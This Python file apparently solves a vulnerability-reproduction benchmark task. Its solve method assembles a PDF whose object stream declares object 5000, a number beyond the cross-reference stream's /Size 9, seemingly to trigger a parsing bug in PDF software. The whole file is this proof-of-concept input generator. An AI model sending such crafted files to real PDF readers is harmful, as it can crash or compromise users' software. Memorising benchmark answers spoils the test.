import os
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        large_obj = 5000

        def obj(num: int, body: bytes) -> bytes:
            return f"{num} 0 obj\n".encode("ascii") + body + b"\nendobj\n"

        def stream_obj(num: int, dict_body: bytes, data: bytes) -> bytes:
            d = b"<< " + dict_body + b" /Length " + str(len(data)).encode("ascii") + b" >>"
            body = d + b"\nstream\n" + data + b"\nendstream"
            return obj(num, body)

        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

        parts = [header]
        offsets = {}

        def add_raw(b: bytes):
            parts.append(b)

        def add_obj(num: int, body: bytes):
            offsets[num] = sum(len(p) for p in parts)
            add_raw(obj(num, body))

        def add_stream(num: int, dict_body: bytes, data: bytes):
            offsets[num] = sum(len(p) for p in parts)
            add_raw(stream_obj(num, dict_body, data))

        # 1: Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page (resources and contents are indirect)
        add_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            b"/Resources 6 0 R /Contents 7 0 R >>",
        )

        # 4: Object stream containing objects 5 and large_obj
        obj5_data = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        objL_data = b"null"
        obj_data = obj5_data + b"\n" + objL_data
        off2 = len(obj5_data) + 1
        hdr = f"5 0 {large_obj} {off2} ".encode("ascii")
        first = len(hdr)
        objstm_data = hdr + obj_data
        add_stream(4, f"/Type /ObjStm /N 2 /First {first}".encode("ascii"), objstm_data)

        # 6: Resources referencing compressed font (object 5)
        add_obj(6, b"<< /Font << /F1 5 0 R >> >>")

        # 7: Contents stream uses F1 so font is loaded
        content = b"BT /F1 12 Tf 72 720 Td (Hi) Tj ET"
        add_stream(7, b"", content)

        # Build xref stream (object 8)
        offset8 = sum(len(p) for p in parts)
        offsets[8] = offset8

        W0, W1, W2 = 1, 4, 2

        def xref_entry(t: int, f1: int, f2: int) -> bytes:
            return bytes((t,)) + int(f1).to_bytes(W1, "big", signed=False) + int(f2).to_bytes(W2, "big", signed=False)

        entries = []
        entries.append(xref_entry(0, 0, 65535))  # 0 free
        entries.append(xref_entry(1, offsets[1], 0))
        entries.append(xref_entry(1, offsets[2], 0))
        entries.append(xref_entry(1, offsets[3], 0))
        entries.append(xref_entry(1, offsets[4], 0))
        entries.append(xref_entry(2, 4, 0))  # 5 is in objstm 4 at index 0
        entries.append(xref_entry(1, offsets[6], 0))
        entries.append(xref_entry(1, offsets[7], 0))
        entries.append(xref_entry(1, offsets[8], 0))
        xref_data = b"".join(entries)

        xref_dict = (
            b"/Type /XRef "
            b"/Size 9 "
            b"/Root 1 0 R "
            b"/W [1 4 2] "
            b"/Index [0 9]"
        )
        add_raw(stream_obj(8, xref_dict, xref_data))

        out = b"".join(parts)
        out += b"startxref\n" + str(offset8).encode("ascii") + b"\n%%EOF\n"
        return out